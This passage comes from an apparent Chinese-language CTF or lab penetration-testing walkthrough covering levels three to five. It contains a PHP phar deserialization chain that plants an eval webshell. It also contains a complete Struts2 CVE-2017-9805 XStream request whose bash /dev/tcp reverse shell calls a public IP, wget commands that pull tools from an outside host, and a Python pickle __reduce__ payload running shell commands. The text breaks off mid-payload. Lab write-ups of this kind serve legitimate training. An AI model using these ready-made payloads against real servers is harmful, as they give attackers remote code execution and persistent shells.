class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span> );</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123; </span><br><span class="line">	<span class="variable">$upfile</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>]; </span><br><span class="line">	<span class="variable">$name</span>=<span class="variable">$upfile</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|pht|zip|phar/i&quot;</span>,<span class="variable">$name</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Forbidden upload!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$extName</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$name</span>)));</span><br><span class="line">	<span class="variable">$type</span>=<span class="variable">$upfile</span>[<span class="string">&quot;type&quot;</span>]; </span><br><span class="line">	<span class="variable">$size</span>=<span class="variable">$upfile</span>[<span class="string">&quot;size&quot;</span>]; </span><br><span class="line">	<span class="variable">$tmp_name</span>=<span class="variable">$upfile</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">	<span class="variable">$okType</span>=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$extName</span>!=<span class="string">&#x27;jpeg&#x27;</span> &amp;&amp; <span class="variable">$extName</span>!=<span class="string">&#x27;jpg&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;扩展名不为jpg&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$type</span>!=<span class="string">&#x27;image/pjpeg&#x27;</span> &amp;&amp; <span class="variable">$type</span>!=<span class="string">&#x27;image/jpeg&#x27;</span>)&#123; </span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;文件类型不为jpg&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$size</span>&gt;<span class="number">20000</span>)</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Size too large.&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$upfile</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> .<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mktime</span>()).<span class="string">&#x27;.jpg&#x27;</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">&quot;File exists!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单的审计后不难知道就是一个phar反序列化而已，在index.php的file参数触发：<br>以下是我构造的pop:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$model</span>=<span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;third.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$model</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>()</span><br><span class="line"><span class="meta">?&gt;</span>	</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将生成的phar文件后缀名改为jpg上传，然后注意一下源代码里：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102651929-5af91642-7917-4964-b057-f0583141e93d.png#averageHue=%23031b2c&clientId=ud3ef7058-52a8-4&from=paste&height=74&id=u5f368e73&name=image.png&originHeight=92&originWidth=746&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8524&status=done&style=none&taskId=u24a2eb4e-056a-4883-ad94-983886009bf&title=&width=596.8" alt="image.png"><br>mktime()代表的就是时间戳，所以这边我们要爆破时间戳去找到文件名：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668103355057-25db2cd0-809b-4b2b-9be4-1b02670cc515.png#averageHue=%23f7f5f2&clientId=ud3ef7058-52a8-4&from=paste&height=353&id=u875ff31f&name=image.png&originHeight=441&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53275&status=done&style=none&taskId=ue8560da7-1434-4bda-ae30-9da1e49886e&title=&width=726.4" alt="image.png"><br>找到文件后phar包含：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668103376608-529f58c9-e4a9-4fc7-9098-f8343d13deb4.png#averageHue=%2330363f&clientId=ud3ef7058-52a8-4&from=paste&height=91&id=ucb3fa33c&name=image.png&originHeight=114&originWidth=899&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24229&status=done&style=none&taskId=udb12ca92-8fa9-4f54-98af-afef041b372&title=&width=719.2" alt="image.png"><br>上号：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668103409568-618624d7-d505-4bac-93fb-02118414c975.png#averageHue=%23f1f0f0&clientId=ud3ef7058-52a8-4&from=paste&height=244&id=u50bea707&name=image.png&originHeight=305&originWidth=1255&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27506&status=done&style=none&taskId=ua9860e24-9c21-4ae5-9e1f-44def0f3544&title=&width=1004" alt="image.png"><br>第三层致此结束</p>
<h3 id="0x2-4-四层代理"><a href="#0x2-4-四层代理" class="headerlink" title="0x2.4 四层代理"></a>0x2.4 四层代理</h3><p>扫段：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668103554518-b6abe713-61bc-4c54-924b-7d0266b085da.png#averageHue=%23090808&clientId=ud3ef7058-52a8-4&from=paste&height=224&id=u7514d900&name=image.png&originHeight=280&originWidth=640&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21577&status=done&style=none&taskId=u688a067b-0855-41f2-a6e4-441071aab8e&title=&width=512" alt="image.png"><br>fscan嗦：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668103603217-2b2d7a4f-bb1f-4a7a-bda4-ac960a13a283.png#averageHue=%23f4f3f3&clientId=ud3ef7058-52a8-4&from=paste&height=148&id=ud6342b0e&name=image.png&originHeight=185&originWidth=616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10336&status=done&style=none&taskId=u092a1652-e428-4560-879f-71b9379af5f&title=&width=492.8" alt="image.png"><br>目标网址是<a target="_blank" rel="noopener" href="http://10.18.129.122:8080/">http://10.18.129.122:8080</a><br>搭建代理：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668103821180-4849202c-7a80-4871-ab99-6fa0db137cf5.png#averageHue=%230d0c0c&clientId=ud3ef7058-52a8-4&from=paste&height=149&id=ub99e88ef&name=image.png&originHeight=186&originWidth=823&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9319&status=done&style=none&taskId=ufb3255fd-faef-48c9-8bb2-6b8c2157342&title=&width=658.4" alt="image.png"><br>访问靶场：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668103882859-9dd600b1-f090-4a5e-bddd-9fc44a7ee20a.png#averageHue=%23f9f6f6&clientId=ud3ef7058-52a8-4&from=paste&height=440&id=ua8f726f8&name=image.png&originHeight=550&originWidth=1321&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54984&status=done&style=none&taskId=u2fb21ac2-cdcc-448e-938d-c3b668d6d1e&title=&width=1056.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668103890104-6c43f5ed-fbba-419d-9bb9-3c3e15ca31e2.png#averageHue=%23f2d7a1&clientId=ud3ef7058-52a8-4&from=paste&height=234&id=u7b7752ae&name=image.png&originHeight=292&originWidth=1146&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27111&status=done&style=none&taskId=u83efd3d8-2b4e-4ec8-93b9-1d0cc192103&title=&width=916.8" alt="image.png"><br>看报错可以很快的知道是啥框架，这是一个status2框架，经过测试发现考点是CVE2017-9805<br>一个RCE的漏洞，这边可以反弹shell到我另一个公网vps(为了方便，假如用一台的话，就开两个就好了，这边主要是为了思路清晰）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104077091-8b3d864f-0b04-4251-86c8-cb8e7479fa8a.png#averageHue=%23b0afae&clientId=ud3ef7058-52a8-4&from=paste&height=70&id=u25008d6e&name=image.png&originHeight=87&originWidth=537&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4667&status=done&style=none&taskId=ue7fc4bde-1d81-46a1-9cf7-ba0e49a8b74&title=&width=429.6" alt="image.png">这就是开2个一样的就行，可能大家都以为不能这样，实际完全可以<br>请求包如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">POST /orders/4/edit HTTP/1.1</span><br><span class="line">Host: 10.18.129.122:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://10.18.129.122:8080/orders.xhtml</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: JSESSIONID=512614C8B8ADB67114871A0AA7EC8827</span><br><span class="line">If-None-Match: -1346813468</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 1807</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line"> &lt;entry&gt;</span><br><span class="line"> &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line"> &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line"> &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line"> &lt;dataHandler&gt;</span><br><span class="line"> &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line"> &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line"> &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line"> &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line"> &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line"> &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line"> &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line"> &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line"> &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line"> &lt;command&gt;</span><br><span class="line"> &lt;string&gt;bash&lt;/string&gt;&lt;string&gt;-c&lt;/string&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp;/dev/tcp/175.178.154.216/6666 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line"> &lt;/command&gt;</span><br><span class="line"> &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line"> &lt;/next&gt;</span><br><span class="line"> &lt;/iter&gt;</span><br><span class="line"> &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line"> &lt;method&gt;</span><br><span class="line"> &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line"> &lt;name&gt;start&lt;/name&gt;</span><br><span class="line"> &lt;parameter-types/&gt;</span><br><span class="line"> &lt;/method&gt;</span><br><span class="line"> &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line"> &lt;/filter&gt;</span><br><span class="line"> &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line"> &lt;/serviceIterator&gt;</span><br><span class="line"> &lt;lock/&gt;</span><br><span class="line"> &lt;/cipher&gt;</span><br><span class="line"> &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line"> &lt;ibuffer/&gt;</span><br><span class="line"> &lt;done&gt;false&lt;/done&gt;</span><br><span class="line"> &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line"> &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line"> &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line"> &lt;/is&gt;</span><br><span class="line"> &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line"> &lt;/dataSource&gt;</span><br><span class="line"> &lt;transferFlavors/&gt;</span><br><span class="line"> &lt;/dataHandler&gt;</span><br><span class="line"> &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line"> &lt;/value&gt;</span><br><span class="line"> &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line"> &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line"> &lt;/entry&gt;</span><br><span class="line"> &lt;entry&gt;</span><br><span class="line"> &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line"> &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line"> &lt;/entry&gt;</span><br><span class="line"> &lt;/map&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104344126-5eca23b0-d75d-4c57-a39a-1e2adca95985.png#averageHue=%23100e0c&clientId=ud3ef7058-52a8-4&from=paste&height=78&id=u32ca080c&name=image.png&originHeight=97&originWidth=492&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7443&status=done&style=none&taskId=u17b534a6-057a-42df-aef8-d48d1f1e517&title=&width=393.6" alt="image.png"><br>第四层结束~</p>
<h3 id="0x2-5-五层代理"><a href="#0x2-5-五层代理" class="headerlink" title="0x2.5 五层代理"></a>0x2.5 五层代理</h3><p>得到了反弹shell之后可能大家就不知道咋办了，这里可以用wget去下就好了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://43.140.251.169/agent_linux_x64</span><br><span class="line">wget http://43.140.251.169/fscan_amd64</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104326416-9b449a28-1bd9-4a67-8dde-eb7854c0aa7e.png#averageHue=%23070504&clientId=ud3ef7058-52a8-4&from=paste&height=128&id=u19623400&name=image.png&originHeight=160&originWidth=718&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13755&status=done&style=none&taskId=uae33f5b0-b454-4db5-805f-5e1c722edf9&title=&width=574.4" alt="image.png"><br>工具在手天下我有！<br>开扫！！！！！！：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104391599-d52edeb8-36e2-40ba-aad6-9cf0cd0d3fa6.png#averageHue=%231c1a18&clientId=ud3ef7058-52a8-4&from=paste&height=248&id=u98b76d6f&name=image.png&originHeight=310&originWidth=570&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23830&status=done&style=none&taskId=ue4f0eb1a-a80c-410d-85f2-2e3785fa2dd&title=&width=456" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104426298-b1de0353-4d08-4e8e-8cb0-07f686d2853f.png#averageHue=%23060504&clientId=ud3ef7058-52a8-4&from=paste&height=415&id=u11f9dbca&name=image.png&originHeight=519&originWidth=1334&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41266&status=done&style=none&taskId=udf4badfc-94a6-4528-b36c-6b04a148a88&title=&width=1067.2" alt="image.png"><br>EZEZ~<br>搭建代理：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104502370-68253d5c-2c55-4180-b80e-e9099faf2a49.png#averageHue=%230b0a09&clientId=ud3ef7058-52a8-4&from=paste&height=49&id=u72c4cab6&name=image.png&originHeight=61&originWidth=745&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3458&status=done&style=none&taskId=uaedd443a-9e75-4411-bf56-011d88582ea&title=&width=596" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104512560-b152c492-cdfc-4146-aa40-94cf7e903336.png#averageHue=%23090807&clientId=ud3ef7058-52a8-4&from=paste&height=82&id=ub23bf061&name=image.png&originHeight=103&originWidth=786&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5628&status=done&style=none&taskId=uc05f3eb3-49de-43e9-aa00-5ce214c1e78&title=&width=628.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104519905-0522072f-a85c-41e5-9f4c-74be0e989602.png#averageHue=%23131212&clientId=ud3ef7058-52a8-4&from=paste&height=138&id=u7f5f3850&name=image.png&originHeight=172&originWidth=608&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7180&status=done&style=none&taskId=u469586cb-f095-4dad-9213-778b3223178&title=&width=486.4" alt="image.png"><br>到此基本就结束了，继续去访问靶场：<br><a target="_blank" rel="noopener" href="http://10.18.130.50/">http://10.18.130.50</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104580896-7dad28bf-a781-4ba7-ad4e-44d003673da7.png#averageHue=%23fbfbfb&clientId=ud3ef7058-52a8-4&from=paste&height=202&id=uf8997384&name=image.png&originHeight=253&originWidth=1016&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6707&status=done&style=none&taskId=u1836e136-1899-471b-9c4d-5d3cca2ec72&title=&width=812.8" alt="image.png"><br>根据提示name是可以控制的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668104598450-408293e4-2fbe-4364-a57f-fa2734061f4c.png#averageHue=%23f5ecc8&clientId=ud3ef7058-52a8-4&from=paste&height=82&id=ua5467b22&name=image.png&originHeight=103&originWidth=670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5555&status=done&style=none&taskId=u62aa3ae5-88a8-4614-8ea3-50e60245968&title=&width=536" alt="image.png"><br>这边我以为有SSTI,测试了好久发现没用，而且题目给了源码<a target="_blank" rel="noopener" href="http://www.zip,但是不在/www.zip%E8%80%8C%E6%98%AF/static/www.zip%EF%BC%9A">www.zip，但是不在/www.zip而是/static/www.zip：</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> send_from_directory</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> loads</span><br><span class="line"><span class="keyword">import</span> os,base64</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Wrong name&#x27;</span></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name+<span class="string">&quot;\n\n\n\n\n&lt;!--/?name=guest\nEnviroment: python 3.5\n src in www.zip--&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(os.path.join(<span class="string">&#x27;static&#x27;</span>, filename)):</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>,filename,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/load&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        file=request.form[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        backlist=[<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;popen2&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> back <span class="keyword">in</span> backlist:</span><br><span class="line">            <span class="keyword">if</span> back <span class="keyword">in</span> file:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;No black&#x27;</span></span><br><span class="line">        unpickler=loads(base64.b64decode(file))</span><br><span class="line">        <span class="keyword">return</span> unpickler</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>非常非常简单的代码审计，只要是个人都能看到首先ban了{那就注定没SSTI，其次load里有个pickle反序列化，所以肯定就是考这个了<br>构造opcode：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls / &gt;/app/static/6.txt&#x27;)&quot;</span>,))</span><br><span class="line">        <span class="comment"># return 